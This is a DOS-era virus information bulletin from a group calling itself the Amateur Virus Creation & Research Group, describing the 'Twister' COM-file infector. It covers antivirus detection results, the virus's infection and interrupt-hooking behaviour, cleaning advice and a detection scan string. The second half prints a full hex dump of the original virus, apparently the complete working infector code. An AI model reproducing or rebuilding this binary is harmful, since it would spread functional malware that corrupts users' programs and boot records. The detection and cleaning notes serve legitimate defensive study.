
                #######     #        #  #########  # ########
               #       #    #        #  #          ###     ##
              #         #   #        #  #          #       ##
              ###########   #        #  #          #
              #         #   #        #  #          #
              #         #    #      #   #          #
              #         #     ######    #########  #



    ###   ###    ####    #######    ####    ########  #  #    #  #######
    #  ###  #   #    #   #         #    #        ##   #  ##   #  #
    #       #  #      #  #  ####  #      #     ##     #  # #  #  #####
    #       #  ########  #    ##  ########   ##       #  #  # #  #
    #       #  #      #  #######  #      #  ########  #  #   ##  #######


       Distributed By Amateur Virus Creation & Research Group (AVCR)

#############################################################################
#############################################################################
Name Of Virus:  TWISTER VIRUS
-----------------------------------------------------------------------------
Alias:  Twistone
-----------------------------------------------------------------------------
Type Of Code:  Unknown
-----------------------------------------------------------------------------
VSUM Information - (NONE)
-----------------------------------------------------------------------------
Antivirus Detection:
(1)
ThunderByte Anti Virus (TBAV) reported twister.com as "Possible Virus"

(2)
Frisk Software's F-Protect (F-PROT) reported twister.com as "Seems to be
infected with unknown"

(3)
McAfee Softwares Anti Virus (SCAN.EXE) reported twister.com as clean.

(4)
MicroSoft Anti Virus (MSAV.EXE) reported twister.com as clean.
-----------------------------------------------------------------------------
Execution Results:
It nails 1 Com file every time it's executed, (or the infected file is
executed), It loads into the systems Master Boot Record (In Sector 195
as near as I can tell).
It hooks Int. 2 (NMI) - 8 (Timer) - 9 (Keyboard) - 0E (Diskette) -
22 (Dos Terminate) - 23 (Dos Ctrl-C) - 24 (Fatal Error Handler) - 2E
(File Execute) - 2F (Program Multiplex)
I Can't find a specific address it's loading at yet.. I'm still working

-----------------------------------------------------------------------------
Cleaning Recommendations:Delete Infected or TBAV (using Anti-Vir.dat..)
-----------------------------------------------------------------------------
Researcher's Notes:
Here's the Scan string to add to your AV software for Twister...
8B F6 90 90 B8 01 FA BA 45 59 CD 16 E8 00

-----------------------------------------------------------------------------
            Disassembly of the 'Twister' Orig. Virus, (Raw format)
-----------------------------------------------------------------------------

000000: 8B F6 90 90 B8 01 FA BA  45 59 CD 16 E8 00 00 5D ........EY.....
000010: 81 ED 0F 01 8D 9E 22 02  FF 37 43 43 FF 37 B4 1A ......"..7CC.7.
000020: 8D 96 26 02 CD 21 CC B4  4E 8D 96 1A 02 CD 21 72 ..&..!..N.....!
000030: 03 EB 04 90 E9 C3 00 B4  2F CD 21 33 C0 8D 77 1E ......../.!3..w
000040: AC 0A C0 75 FB 83 EE 04  AC 3C 43 74 03 E9 A5 00 ...u.....<Ct...
000050: 83 EE 03 AC 3C 44 74 F5  8D 96 44 02 B8 01 43 33 ....<Dt...D...C
000060: C9 CD 21 8D 96 44 02 B1  7A 86 E1 B0 04 D1 E8 CD ..!..D..z......
000070: 21 93 8D BE 40 02 8B 05  2D 03 00 89 86 1F 02 B4 !...@...-......
000080: 3F B9 04 00 8D 96 22 02  CD 21 8D BE 25 02 80 3D ?....."..!..%..
000090: 90 74 62 B8 00 42 33 C9  33 D2 CD 21 B8 00 57 CD .tb..B3.3..!..W
0000A0: 21 89 16 28 02 89 0E 2A  02 B4 40 B9 04 00 8D 96 !..(...*..@....
0000B0: 1E 02 CD 21 B8 02 42 33  C9 33 D2 CD 21 B4 40 B9 ...!..B3.3..!.@
0000C0: 26 01 8D 96 00 01 CD 21  B8 00 2C CD 21 8A CA 8A &......!..,.!..
0000D0: C1 B8 00 2C CD 21 8A CA  02 C8 D0 C9 32 ED 33 D2 ...,.!......2.3
0000E0: B4 40 CD 21 8B 0E 2A 02  8B 16 28 02 B8 01 57 CD .@.!..*...(...W
0000F0: 21 B4 3E CD 21 B4 4F E9  2F FF B4 1A BA 80 00 CD !.>.!.O./......
000100: 21 BB 02 01 8F 07 4B 4B  8F 07 53 33 C0 33 DB 33 !.....KK..S3.3.
000110: C9 33 D2 33 ED 33 F6 33  FF C3 2A 2E 2A 00 E9 00 .3.3.3.3..*.*..
000120: 00 90 CD 20 00 00 00 00  00 00 00 00 54 68 61 6E ... ........Tha
000130: 6B 73 20 74 6F 20 56 69  70 65 72 2C 20 4D 65 6D ks to Viper, Me
000140: 6F 72 79 20 4C 61 70 73  65 00 00 00 00 00 00 00 ory Lapse......

It uses through E9 (on line 000110) when it infects.

